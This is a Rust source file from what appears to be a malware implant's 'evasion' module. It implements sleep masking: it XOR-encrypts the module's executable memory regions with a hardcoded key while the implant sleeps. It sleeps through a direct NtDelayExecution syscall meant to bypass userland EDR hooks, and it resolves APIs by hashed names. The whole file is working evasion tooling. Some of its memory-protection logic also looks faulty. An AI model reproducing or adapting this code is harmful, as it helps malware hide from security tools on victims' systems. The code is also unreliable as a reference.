// Sleep masking — mirror of Go agent/internal/win/masking.go.
// XOR-encrypts the module's executable regions during sleep, then restores.

#![cfg(target_os = "windows")]

use crate::evasion::pe::*;
use crate::evasion::patch::protect_virtual_memory;
use crate::evasion::patch::InvokeMode;
use crate::evasion::ssn;
use crate::evasion::syscall;

struct ExecRegion {
    base: usize,
    size: usize,
}

/// Enumerate MEM_IMAGE executable regions of the current module via VirtualQuery.
fn module_exec_regions() -> Result<Vec<ExecRegion>, String> {
    unsafe {
        let k32 = module_kernel32();
        let vq = get_export(k32, hash_ansi("VirtualQuery"));
        if vq == 0 {
            return Err("VirtualQuery unresolved".into());
        }
        // PEB.ImageBaseAddress at offset 0x10.
        let peb = crate::evasion::pe::peb();
        let image_base = *( (peb + 0x10) as *const usize);
        let mut regions = Vec::new();
        let mut addr = image_base;
        loop {
            let mut mbi = [0u8; 48]; // MEMORY_BASIC_INFORMATION (48 bytes on x64)
            let st = call_vq(vq, addr, mbi.as_mut_ptr() as usize, mbi.len());
            if st == 0 {
                break;
            }
            let base = read_u64(&mbi, 0) as usize;
            let region_size = read_u64(&mbi, 16) as usize;
            let protect = read_u32(&mbi, 24);
            let mtype = read_u32(&mbi, 40);
            if region_size == 0 {
                break;
            }
            const MEM_IMAGE: u32 = 0x1000000;
            const PAGE_EXECUTE_FLAGS: u32 = 0x10 | 0x20 | 0x40 | 0x80;
            if mtype & MEM_IMAGE != 0 && protect & PAGE_EXECUTE_FLAGS != 0 {
                regions.push(ExecRegion { base, size: region_size });
            }
            let next = addr + region_size;
            if next <= addr {
                break;
            }
            addr = next;
        }
        Ok(regions)
    }
}

unsafe fn call_vq(vq: usize, addr: usize, out: usize, len: usize) -> usize {
    let ret: usize;
    core::arch::asm!(
        "mov r10, rcx",
        "call {vq}",
        vq = in(reg) vq,
        in("rcx") addr,
        in("rdx") out,
        in("r8") len,
        in("r9") 0usize,
        lateout("rax") ret,
        options(nostack)
    );
    ret
}

unsafe fn read_u64(b: &[u8], off: usize) -> u64 {
    u64::from_ne_bytes(b[off..off+8].try_into().unwrap())
}
unsafe fn read_u32(b: &[u8], off: usize) -> u32 {
    u32::from_ne_bytes(b[off..off+4].try_into().unwrap())
}

/// XOR the executable regions (on=true encrypt, false decrypt).
fn mask_with_key(key: &[u8], on: bool) -> Result<(), String> {
    let regions = module_exec_regions()?;
    for r in &regions {
        let _ = protect_virtual_memory(InvokeMode::Api, r.base, r.size, PAGE_READWRITE);
        let region = unsafe { std::slice::from_raw_parts_mut(r.base as *mut u8, r.size) };
        let mut ki = 0usize;
        for (i, b) in region.iter_mut().enumerate() {
            *b ^= key[ki % key.len()] ^ (i as u8);
            ki += 1;
        }
        let _ = protect_virtual_memory(InvokeMode::Api, r.base, r.size, if on { PAGE_NOACCESS } else { PAGE_EXECUTE | PAGE_READWRITE });
    }
    Ok(())
}

/// Sleep with the executable regions masked.
pub fn mask_sleep(ms: i32) -> Result<(), String> {
    let key = [0xDE, 0xAD, 0xBE, 0xEF, 0xC0, 0xDE, 0xBA, 0xBE];
    mask_with_key(&key, true)?;
    let r = delay_execution(ms);
    let _ = mask_with_key(&key, false);
    r
}

/// NtDelayExecution via resolved SSN (sleep without touching userland hooks).
fn delay_execution(ms: i32) -> Result<(), String> {
    unsafe {
        if let Some(e) = ssn::ssn_by_name("NtDelayExecution") {
            let interval: i64 = (ms as i64) * 10000; // 100ns units
            let st = syscall::direct_syscall5(e.ssn, 0, &interval as *const _ as usize, 0, 0, 0);
            if (st as i32) < 0 {
                return Err(format!("NtDelayExecution: 0x{st:x}"));
            }
            Ok(())
        } else {
            // Fallback: kernel32 Sleep via resolved pointer.
            let k32 = module_kernel32();
            let sleep_proc = get_export(k32, hash_ansi("Sleep"));
            if sleep_proc == 0 {
                return Err("Sleep unresolved".into());
            }
            let _ = crate::evasion::ssn::call_api(sleep_proc, ms as usize, 0, 0, 0, 0, 0);
            Ok(())
        }
    }
}
